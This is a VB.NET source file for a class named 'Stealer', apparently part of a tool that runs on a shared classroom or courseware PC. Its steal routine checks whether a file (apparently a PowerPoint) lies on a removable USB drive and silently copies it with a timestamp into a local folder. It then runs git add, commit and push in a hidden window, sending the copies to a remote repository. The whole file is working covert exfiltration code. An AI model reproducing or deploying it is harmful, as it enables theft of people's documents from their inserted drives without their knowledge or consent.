Public Class Stealer
    Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Int32
    Public Const DRIVE_UNKNOWN = 0
    Public Const DRIVE_NO_ROOT_DIR = 1
    Public Const DRIVE_REMOVABLE = 2
    Public Const DRIVE_FIXED = 3
    Public Const DRIVE_REMOTE = 4
    Public Const DRIVE_CDROM = 5
    Public Const DRIVE_RAMDISK = 6
    Public Shared Sub steal(ppt As String)
        Try
            Dim f As Boolean = True
            Dim tmp As New IO.FileInfo(ppt)

            If GetDriveType(System.IO.Path.GetPathRoot(ppt)) <> DRIVE_REMOVABLE Then
                f = False
            End If
            If f Then
                Dim new_name As String = tmp.Name.Replace(tmp.Extension, "") + Format(Now(), "_yyyy_MM_dd_HH_mm_ss_ff") + tmp.Extension
                IO.Directory.CreateDirectory("D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd"))
                IO.File.Copy(ppt, "D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd") + "\" + new_name)
            End If
            Dim git As New CommandRunner("C:\Program Files\Git\cmd\git.exe", "D:\课件\新建文件夹")
            logcat.Log.Logger.Instance.WriteLog(git.Run("add ."))
            logcat.Log.Logger.Instance.WriteLog(git.Run("commit -m """ & Format(Now(), "yyyy_MM_dd_HH_mm_ss_ff") & """"))
            logcat.Log.Logger.Instance.WriteLog(git.Run("push -u origin master"))
        Catch ex As Exception
            logcat.Log.Logger.Instance.WriteException(ex)
        End Try
    End Sub
    Public Class CommandRunner
        Public Shared Property ExecutablePath As String
        Public Shared Property WorkingDirectory As String

        Public Sub New(ByVal executablePath1 As String, ByVal Optional workingDirectory1 As String = Nothing)
            ExecutablePath = If(executablePath1, CSharpImpl.__Throw(Of System.String)(New ArgumentNullException(NameOf(executablePath1))))
            WorkingDirectory = If(workingDirectory1, IO.Path.GetDirectoryName(executablePath1))
        End Sub

        Public Function Run(ByVal arguments As String) As String
            Dim info = New ProcessStartInfo() With {
                .FileName = ExecutablePath,
                .Arguments = arguments,
                .CreateNoWindow = True,
                .RedirectStandardOutput = True,
                .UseShellExecute = False,
                .WorkingDirectory = WorkingDirectory
            }
            Dim process = New Process With {
                .StartInfo = info
            }
            process.Start()
            Return process.StandardOutput.ReadToEnd()
        End Function

        Private Class CSharpImpl
            <Obsolete("Please refactor calling code to use normal throw statements")>
            Shared Function __Throw(Of T)(ByVal e As Exception) As T
                Throw e
            End Function
        End Class
    End Class
End Class
